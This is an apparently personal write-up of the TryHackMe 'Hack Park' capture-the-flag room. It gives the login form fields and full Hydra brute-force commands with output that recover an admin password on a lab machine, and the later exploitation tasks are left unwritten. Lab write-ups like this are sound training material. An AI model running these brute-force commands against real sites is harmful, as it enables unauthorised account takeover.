# TryHackMe: Hack Park

[Hack Park](https://tryhackme.com/room/hackpark) is a TryHackMe CTF. 

> Bruteforce a websites login with Hydra, identify and use a public exploit then escalate your privileges on this Windows machine!

	
## [Task 1] Deploy the vulnerable Windows machine

On browsing to the home page, we see a clown.

I ran the image through an image search engine, [TinyEye](https://tinyeye.com).

And eventually found the clown's name on an article from [Slate](https://slate.com/culture/2016/10/evil-clowns-have-been-sighted-all-over-america-since-1981.html).

## [Task 2] Using Hydra to brute-force a login

The login area is accessible from the sidebar. 

`http://10.10.136.50/Account/login.aspx?ReturnURL=/admin/`

Here there is `POST` form taking input params:

```
ctl00$MainContent$LoginUser$UserName: USERNAME
ctl00$MainContent$LoginUser$Password: PASSWORD
ctl00$MainContent$LoginUser$LoginButton: Log+in
```

We can attack this form with Hydra. 

```shell
hydra -l username -P passwords.txt IP.ADD.RE.SS http-port-form
```

Prior to initiating an attack, I found user `Admin` from a post on the blog: `http://10.10.136.50/author/Admin`. Though, notably, there is another user on the blog that had left a comment on `Admin`'s post, `Visitor1`. First we'll run hydra against `Admin`, however.

```console
kali@kali:~$ hydra -l Admin -P /usr/share/wordlists/fasttrack.txt 10.10.136.50 http-post-form "/Account/login.aspx:ctl00\$MainContent\$LoginUser\$UserName=^USER^&ctl00\$MainContent\$LoginUser\$Password=^PASS^&ctl00\$MainContent\$LoginUser\$LoginButton=Log+in:S=302" -v -I

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-09-19 17:51:10
[DATA] max 16 tasks per 1 server, overall 16 tasks, 222 login tries (l:1/p:222), ~14 tries per task
[DATA] attacking http-post-form://10.10.136.50:80/Account/login.aspx:ctl00$MainContent$LoginUser$UserName=^USER^&ctl00$MainContent$LoginUser$Password=^PASS^&ctl00$MainContent$LoginUser$LoginButton=Log+in:S=302
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[80][http-post-form] host: 10.10.136.50   login: Admin   password: secuirty3
[STATUS] attack finished for 10.10.136.50 (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-09-19 17:51:13
```


```shell
hydra -f -l admin -P /data/src/wordlists/rockyou.txt 10.10.136.50 http-post-form "/Account/login.aspx?ReturnURL=/admin/:__VIEWSTATE=nbWrkCqQ%2B1Hn%2Fgt8OwrXb%2B%2BFMX0bVJv9xbWiO3oASE6l0%2BDl73MXEP2ao2pwbsK6Jr4MzOI9cbeVU7o5WL%2BFKDPWl1RXjt5kLGmi%2F1d9biM%2Fi3jThbmDihH1A7JWIVyWFQ3lIXAOLpqdlBKHFv6dZd8XzdjcN%2FrgmGzhog7Sf0Ml3kvolr3pzU9VlhHtBqJZNJ%2FkQVxtOT%2Bc%2FxMceQklmwd%2FeiI1sb4%2B4Mv4ol44Uy4Mf9Vaw%2B6OUiBt1BZn8PQoOcFS6ul97keSrPf2jTIqUqeC1YQwwE0FU7Syl8jfviP6nsNb4aSX6ASTDZlajXjkTtFum%2Bpk3uz4%2FtNoraPjA%2FTn5DuX56Sbr4I9oGPQznIuhjc0&__EVENTVALIDATION=pKMn8W0WIp7BuOhOq9YO49%2BqkAVDl1TJjXzk%2BDzHnOyizFWE7BYkR%2Frn983R5edqA0yBYDn%2Fi7BIxrq%2FJlxoiMHPZ2UN1iFWs83YOrgnVHxJtr4R811S4kAhpj4kb6aqZ1r9F5iqUqIoj3gfQjf%2BtO7mRTdLARthnldxPEA73U3caeMM&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed"
```

## [Task 3] Compromise the machine

_TBA_

## [Task 4] Windows Privilege Escalation

_TBA_

## [Task 5] Privilege Escalation Without Metasploit 

_TBA_